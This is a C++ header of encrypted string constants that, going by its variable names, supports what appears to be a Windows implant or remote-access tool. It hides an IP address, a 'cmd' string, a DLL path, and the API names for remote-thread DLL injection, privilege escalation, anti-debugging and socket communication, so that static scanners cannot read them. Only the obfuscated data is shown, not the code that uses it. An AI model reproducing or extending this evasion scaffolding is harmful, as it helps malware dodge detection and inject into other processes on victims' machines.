#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i + 9) + 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i - BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 184)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 25, 106, 215, 59, 21, 18, 220, 250, 48, 46, 30, 37, 223, 4, 140, 162 };

typedef struct EncryptedString {
    unsigned char* data;
    size_t length;
} EncryptedString;

static unsigned char str_ip_data[] = { 1, 164, 136, 132, 150, 171, 220, 155, 150, 168, 154 };
static EncryptedString str_ip = {
    str_ip_data,
    sizeof(str_ip_data)
};

static unsigned char str_cmd_data[] = { 127, 246, 215, 215, 150, 254, 138, 206, 152, 182, 217, 143 };
static EncryptedString str_cmd = {
    str_cmd_data,
    sizeof(str_cmd_data)
};

static unsigned char str_dllPath_data[] = { 86, 214, 128, 239, 237, 232, 151, 217, 203, 197, 238, 238, 212, 238, 194, 251, 148, 196, 201, 208, 248, 210, 170, 135, 239, 148, 200, 216, 235, 201, 203, 192, 205, 229, 185, 223, 215, 216, 209, 169, 217, 173, 174, 203, 142, 153, 230, 153, 253, 213, 203, 234, 219, 220, 166, 208, 180, 150, 219, 208, 238, 248, 254, 213, 156, 199, 150, 191 };
static EncryptedString str_dllPath = {
    str_dllPath_data,
    sizeof(str_dllPath_data)
};

static unsigned char str_socket_data[] = { 122, 230, 213, 208, 211, 254, 134, 171 };
static EncryptedString str_socket = {
    str_socket_data,
    sizeof(str_socket_data)
};

static unsigned char str_NtSetInformationThread_data[] = { 59, 219, 206, 224, 221, 239, 187, 197, 222, 246, 232, 226, 217, 173, 147, 200, 190, 245, 210, 201, 233, 220, 190, 219 };
static EncryptedString str_NtSetInformationThread = {
    str_NtSetInformationThread_data,
    sizeof(str_NtSetInformationThread_data)
};

static unsigned char str_GetCurrentThread_data[] = { 0, 210, 223, 199, 251, 238, 128, 217, 221, 247, 238, 219, 208, 171, 159, 198, 180, 161 };
static EncryptedString str_GetCurrentThread = {
    str_GetCurrentThread_data,
    sizeof(str_GetCurrentThread_data)
};

static unsigned char str_Sleep_data[] = { 55, 198, 214, 214, 221, 235, 242 };
static EncryptedString str_Sleep = {
    str_Sleep_data,
    sizeof(str_Sleep_data)
};

static unsigned char str_OpenProcess_data[] = { 103, 218, 202, 214, 214, 203, 128, 196, 219, 252, 233, 252, 184 };
static EncryptedString str_OpenProcess = {
    str_OpenProcess_data,
    sizeof(str_OpenProcess_data)
};

static unsigned char str_VirtualAllocEx_data[] = { 115, 195, 211, 193, 204, 238, 147, 199, 249, 245, 246, 224, 219, 156, 130, 167 };
static EncryptedString str_VirtualAllocEx = {
    str_VirtualAllocEx_data,
    sizeof(str_VirtualAllocEx_data)
};

static unsigned char str_WriteProcessMemory_data[] = { 9, 194, 200, 218, 204, 254, 162, 217, 215, 250, 255, 252, 203, 148, 159, 202, 191, 211, 195, 187 };
static EncryptedString str_WriteProcessMemory = {
    str_WriteProcessMemory_data,
    sizeof(str_WriteProcessMemory_data)
};

static unsigned char str_LoadLibraryA_data[] = { 110, 217, 213, 210, 220, 215, 155, 201, 202, 248, 232, 246, 249, 217 };
static EncryptedString str_LoadLibraryA = {
    str_LoadLibraryA_data,
    sizeof(str_LoadLibraryA_data)
};

static unsigned char str_CreateRemoteThread_data[] = { 34, 214, 200, 214, 217, 239, 151, 249, 221, 244, 245, 251, 221, 141, 146, 213, 181, 192, 222, 187 };
static EncryptedString str_CreateRemoteThread = {
    str_CreateRemoteThread_data,
    sizeof(str_CreateRemoteThread_data)
};

static unsigned char str_CloseHandle_data[] = { 97, 214, 214, 220, 203, 254, 186, 202, 214, 253, 246, 234, 184 };
static EncryptedString str_CloseHandle = {
    str_CloseHandle_data,
    sizeof(str_CloseHandle_data)
};

static unsigned char str_LookupPrivilegeValueA_data[] = { 5, 217, 213, 220, 211, 238, 130, 251, 202, 240, 236, 230, 212, 188, 157, 194, 134, 192, 214, 206, 233, 252, 218 };
static EncryptedString str_LookupPrivilegeValueA = {
    str_LookupPrivilegeValueA_data,
    sizeof(str_LookupPrivilegeValueA_data)
};

static unsigned char str_GetLastError_data[] = { 113, 210, 223, 199, 244, 250, 129, 223, 253, 235, 232, 224, 202, 217 };
static EncryptedString str_GetLastError = {
    str_GetLastError_data,
    sizeof(str_GetLastError_data)
};

static unsigned char str_AdjustTokenPrivileges_data[] = { 83, 212, 222, 217, 205, 232, 134, 255, 215, 242, 255, 225, 232, 171, 147, 209, 185, 205, 223, 220, 233, 206, 218 };
static EncryptedString str_AdjustTokenPrivileges = {
    str_AdjustTokenPrivileges_data,
    sizeof(str_AdjustTokenPrivileges_data)
};

static unsigned char str_OpenProcessToken_data[] = { 108, 218, 202, 214, 214, 203, 128, 196, 219, 252, 233, 252, 236, 182, 145, 194, 190, 161 };
static EncryptedString str_OpenProcessToken = {
    str_OpenProcessToken_data,
    sizeof(str_OpenProcessToken_data)
};

static unsigned char str_GetCurrentProcess_data[] = { 101, 210, 223, 199, 251, 238, 128, 217, 221, 247, 238, 223, 202, 182, 153, 194, 163, 210, 186 };
static EncryptedString str_GetCurrentProcess = {
    str_GetCurrentProcess_data,
    sizeof(str_GetCurrentProcess_data)
};

static unsigned char str_CreateToolhelp32Snapshot_data[] = { 125, 214, 200, 214, 217, 239, 151, 255, 215, 246, 246, 231, 221, 181, 138, 148, 226, 242, 212, 218, 252, 206, 178, 180, 204, 251 };
static EncryptedString str_CreateToolhelp32Snapshot = {
    str_CreateToolhelp32Snapshot_data,
    sizeof(str_CreateToolhelp32Snapshot_data)
};

static unsigned char str_Process32First_data[] = { 108, 197, 200, 220, 219, 254, 129, 216, 139, 171, 220, 230, 202, 170, 142, 167 };
static EncryptedString str_Process32First = {
    str_Process32First_data,
    sizeof(str_Process32First_data)
};

static unsigned char str_Process32Next_data[] = { 70, 197, 200, 220, 219, 254, 129, 216, 139, 171, 212, 234, 192, 173, 250 };
static EncryptedString str_Process32Next = {
    str_Process32Next_data,
    sizeof(str_Process32Next_data)
};

static unsigned char str_CreatePipe_data[] = { 88, 214, 200, 214, 217, 239, 151, 251, 209, 233, 255, 143 };
static EncryptedString str_CreatePipe = {
    str_CreatePipe_data,
    sizeof(str_CreatePipe_data)
};

static unsigned char str_SetHandleInformation_data[] = { 126, 198, 223, 199, 240, 250, 156, 207, 212, 252, 211, 225, 222, 182, 136, 202, 177, 213, 211, 212, 226, 189 };
static EncryptedString str_SetHandleInformation = {
    str_SetHandleInformation_data,
    sizeof(str_SetHandleInformation_data)
};

static unsigned char str_ReadFile_data[] = { 51, 199, 223, 210, 220, 221, 155, 199, 221, 153 };
static EncryptedString str_ReadFile = {
    str_ReadFile_data,
    sizeof(str_ReadFile_data)
};

static unsigned char str_FormatMessageA_data[] = { 20, 211, 213, 193, 213, 250, 134, 230, 221, 234, 233, 238, 223, 188, 187, 167 };
static EncryptedString str_FormatMessageA = {
    str_FormatMessageA_data,
    sizeof(str_FormatMessageA_data)
};

static unsigned char str_LocalFree_data[] = { 40, 217, 213, 208, 217, 247, 180, 217, 221, 252, 154 };
static EncryptedString str_LocalFree = {
    str_LocalFree_data,
    sizeof(str_LocalFree_data)
};

static unsigned char str_CreateProcessA_data[] = { 52, 214, 200, 214, 217, 239, 151, 251, 202, 246, 249, 234, 203, 170, 187, 167 };
static EncryptedString str_CreateProcessA = {
    str_CreateProcessA_data,
    sizeof(str_CreateProcessA_data)
};

static unsigned char str_IsDebuggerPresent_data[] = { 33, 220, 201, 247, 221, 249, 135, 204, 223, 252, 232, 223, 202, 188, 137, 194, 190, 213, 186 };
static EncryptedString str_IsDebuggerPresent = {
    str_IsDebuggerPresent_data,
    sizeof(str_IsDebuggerPresent_data)
};

static unsigned char str_GetModuleHandleW_data[] = { 73, 210, 223, 199, 245, 244, 150, 222, 212, 252, 210, 238, 214, 189, 150, 194, 135, 161 };
static EncryptedString str_GetModuleHandleW = {
    str_GetModuleHandleW_data,
    sizeof(str_GetModuleHandleW_data)
};

static unsigned char str_VirtualProtect_data[] = { 1, 195, 211, 193, 204, 238, 147, 199, 232, 235, 245, 251, 221, 186, 142, 167 };
static EncryptedString str_VirtualProtect = {
    str_VirtualProtect_data,
    sizeof(str_VirtualProtect_data)
};

static unsigned char str_HeapSetInformation_data[] = { 105, 221, 223, 210, 200, 200, 151, 223, 241, 247, 252, 224, 202, 180, 155, 211, 185, 206, 212, 187 };
static EncryptedString str_HeapSetInformation = {
    str_HeapSetInformation_data,
    sizeof(str_HeapSetInformation_data)
};

static unsigned char str_FindWindowW_data[] = { 3, 211, 211, 221, 220, 204, 155, 197, 220, 246, 237, 216, 184 };
static EncryptedString str_FindWindowW = {
    str_FindWindowW_data,
    sizeof(str_FindWindowW_data)
};

static unsigned char str_GetProcessHeap_data[] = { 46, 210, 223, 199, 232, 233, 157, 200, 221, 234, 233, 199, 221, 184, 138, 167 };
static EncryptedString str_GetProcessHeap = {
    str_GetProcessHeap_data,
    sizeof(str_GetProcessHeap_data)
};

static unsigned char str_GetComputerNameW_data[] = { 50, 210, 223, 199, 251, 244, 159, 219, 205, 237, 255, 253, 246, 184, 151, 194, 135, 161 };
static EncryptedString str_GetComputerNameW = {
    str_GetComputerNameW_data,
    sizeof(str_GetComputerNameW_data)
};

static unsigned char str_OpenThread_data[] = { 114, 218, 202, 214, 214, 207, 154, 217, 221, 248, 254, 143 };
static EncryptedString str_OpenThread = {
    str_OpenThread_data,
    sizeof(str_OpenThread_data)
};

static unsigned char str_GetEnvironmentVariableW_data[] = { 107, 210, 223, 199, 253, 245, 132, 194, 202, 246, 244, 226, 221, 183, 142, 241, 177, 211, 211, 218, 238, 209, 191, 140, 184 };
static EncryptedString str_GetEnvironmentVariableW = {
    str_GetEnvironmentVariableW_data,
    sizeof(str_GetEnvironmentVariableW_data)
};

static unsigned char str_GetThreadContext_data[] = { 67, 210, 223, 199, 236, 243, 128, 206, 217, 253, 217, 224, 214, 173, 159, 223, 164, 161 };
static EncryptedString str_GetThreadContext = {
    str_GetThreadContext_data,
    sizeof(str_GetThreadContext_data)
};

static unsigned char str_IsWow64Process_data[] = { 96, 220, 201, 228, 215, 236, 196, 159, 232, 235, 245, 236, 221, 170, 137, 167 };
static EncryptedString str_IsWow64Process = {
    str_IsWow64Process_data,
    sizeof(str_IsWow64Process_data)
};

static unsigned char str_GetWindowLongPtrW_data[] = { 124, 210, 223, 199, 239, 242, 156, 207, 215, 238, 214, 224, 214, 190, 170, 211, 162, 246, 186 };
static EncryptedString str_GetWindowLongPtrW = {
    str_GetWindowLongPtrW_data,
    sizeof(str_GetWindowLongPtrW_data)
};

static unsigned char str_GetWindowRect_data[] = { 86, 210, 223, 199, 239, 242, 156, 207, 215, 238, 200, 234, 219, 173, 250 };
static EncryptedString str_GetWindowRect = {
    str_GetWindowRect_data,
    sizeof(str_GetWindowRect_data)
};

static unsigned char str_WSAStartup_data[] = { 114, 194, 233, 242, 235, 239, 147, 217, 204, 236, 234, 143 };
static EncryptedString str_WSAStartup = {
    str_WSAStartup_data,
    sizeof(str_WSAStartup_data)
};

static unsigned char str_htons_data[] = { 34, 253, 206, 220, 214, 232, 242 };
static EncryptedString str_htons = {
    str_htons_data,
    sizeof(str_htons_data)
};

static unsigned char str_inet_pton_data[] = { 11, 252, 212, 214, 204, 196, 130, 223, 215, 247, 154 };
static EncryptedString str_inet_pton = {
    str_inet_pton_data,
    sizeof(str_inet_pton_data)
};

static unsigned char str_connect_data[] = { 56, 246, 213, 221, 214, 254, 145, 223, 184 };
static EncryptedString str_connect = {
    str_connect_data,
    sizeof(str_connect_data)
};

static unsigned char str_htonl_data[] = { 108, 253, 206, 220, 214, 247, 242 };
static EncryptedString str_htonl = {
    str_htonl_data,
    sizeof(str_htonl_data)
};

static unsigned char str_send_data[] = { 35, 230, 223, 221, 220, 155 };
static EncryptedString str_send = {
    str_send_data,
    sizeof(str_send_data)
};

static unsigned char str_recv_data[] = { 92, 231, 223, 208, 206, 155 };
static EncryptedString str_recv = {
    str_recv_data,
    sizeof(str_recv_data)
};

static unsigned char str_ntohl_data[] = { 52, 251, 206, 220, 208, 247, 242 };
static EncryptedString str_ntohl = {
    str_ntohl_data,
    sizeof(str_ntohl_data)
};

static unsigned char str_closesocket_data[] = { 38, 246, 214, 220, 203, 254, 129, 196, 219, 242, 255, 251, 184 };
static EncryptedString str_closesocket = {
    str_closesocket_data,
    sizeof(str_closesocket_data)
};

static unsigned char str_WSACleanup_data[] = { 53, 194, 233, 242, 251, 247, 151, 202, 214, 236, 234, 143 };
static EncryptedString str_WSACleanup = {
    str_WSACleanup_data,
    sizeof(str_WSACleanup_data)
};

static unsigned char str_kernel32_data[] = { 2, 254, 223, 193, 214, 254, 158, 152, 138, 183, 254, 227, 212, 217 };
static EncryptedString str_kernel32 = {
    str_kernel32_data,
    sizeof(str_kernel32_data)
};

static unsigned char str_ntdll_data[] = { 118, 251, 206, 215, 212, 247, 220, 207, 212, 245, 154 };
static EncryptedString str_ntdll = {
    str_ntdll_data,
    sizeof(str_ntdll_data)
};

static unsigned char str_advapi32_data[] = { 3, 244, 222, 197, 217, 235, 155, 152, 138, 183, 254, 227, 212, 217 };
static EncryptedString str_advapi32 = {
    str_advapi32_data,
    sizeof(str_advapi32_data)
};

static unsigned char str_ws2_32_data[] = { 27, 226, 201, 129, 231, 168, 192, 133, 220, 245, 246, 143 };
static EncryptedString str_ws2_32 = {
    str_ws2_32_data,
    sizeof(str_ws2_32_data)
};

static unsigned char str_user32_data[] = { 11, 224, 201, 214, 202, 168, 192, 133, 220, 245, 246, 143 };
static EncryptedString str_user32 = {
    str_user32_data,
    sizeof(str_user32_data)
};

static unsigned char str_WSAGetLastError_data[] = { 31, 194, 233, 242, 255, 254, 134, 231, 217, 234, 238, 202, 202, 171, 149, 213, 208 };
static EncryptedString str_WSAGetLastError = {
    str_WSAGetLastError_data,
    sizeof(str_WSAGetLastError_data)
};

